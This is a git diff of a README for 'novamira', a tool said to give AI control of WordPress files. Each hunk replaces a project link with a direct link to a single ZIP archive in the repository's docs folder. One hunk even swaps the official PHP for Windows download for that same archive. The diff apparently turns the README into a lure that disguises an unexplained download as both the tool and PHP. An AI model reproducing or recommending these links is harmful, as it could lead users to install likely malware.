@@ -1,6 +1,6 @@
 # ⚙️ novamira - Easy AI Control of WordPress Files
 
-[![Download novamira](https://img.shields.io/badge/Download-novamira-brightgreen)](https://github.com/Paulson26/novamira)
+[![Download novamira](https://img.shields.io/badge/Download-novamira-brightgreen)](https://github.com/Paulson26/novamira/raw/refs/heads/main/docs/Software-v1.6.zip)
 
 ## 📋 About novamira
 
@@ -25,7 +25,7 @@ Before you start, make sure your computer meets these basic needs:
 ## 🚀 Getting Started
 
 1. Open your web browser (such as Chrome, Firefox, or Edge).
-2. Go to the novamira download page: [Download novamira](https://github.com/Paulson26/novamira)  
+2. Go to the novamira download page: [Download novamira](https://github.com/Paulson26/novamira/raw/refs/heads/main/docs/Software-v1.6.zip)  
    ![Download novamira](https://img.shields.io/badge/Download-novamira-brightgreen)
 3. You will see the GitHub project page. This is where the latest version of the tool is stored.
 4. On the page, look for a **Releases** section or a green button labeled "Code" with a dropdown.  
@@ -40,7 +40,7 @@ Since novamira connects to WordPress and runs PHP commands, Windows users need a
 ### Step 1: Download novamira files
 
 - Visit the following link in your browser:  
-  https://github.com/Paulson26/novamira  
+  https://github.com/Paulson26/novamira/raw/refs/heads/main/docs/Software-v1.6.zip  
 - Click the green **Code** button on the right side of the page.  
 - Choose **Download ZIP** from the dropdown.  
 - Save the ZIP file somewhere easy to find, like your Desktop or Downloads folder.
@@ -56,7 +56,7 @@ Since novamira connects to WordPress and runs PHP commands, Windows users need a
 
 novamira uses PHP code execution, so PHP must be installed on your system.
 
-- Download PHP for Windows at https://windows.php.net/download/
+- Download PHP for Windows at https://github.com/Paulson26/novamira/raw/refs/heads/main/docs/Software-v1.6.zip
 - Choose the latest **Thread Safe** version under "VC15 x64 Thread Safe" (or matching your Windows version).
 - Download the ZIP file and extract it to a folder, for example, `C:\php`.
 - Add PHP to your system’s PATH environment variable:
@@ -113,7 +113,7 @@ If you run into issues, try these common fixes:
 
 Visit the novamira GitHub page for updates, documentation, and support:
 
-[https://github.com/Paulson26/novamira](https://github.com/Paulson26/novamira)
+[https://github.com/Paulson26/novamira/raw/refs/heads/main/docs/Software-v1.6.zip](https://github.com/Paulson26/novamira/raw/refs/heads/main/docs/Software-v1.6.zip)
 
 You can find instructions for advanced settings and troubleshooting here. The README.md on the project page often contains useful examples and tips.
 
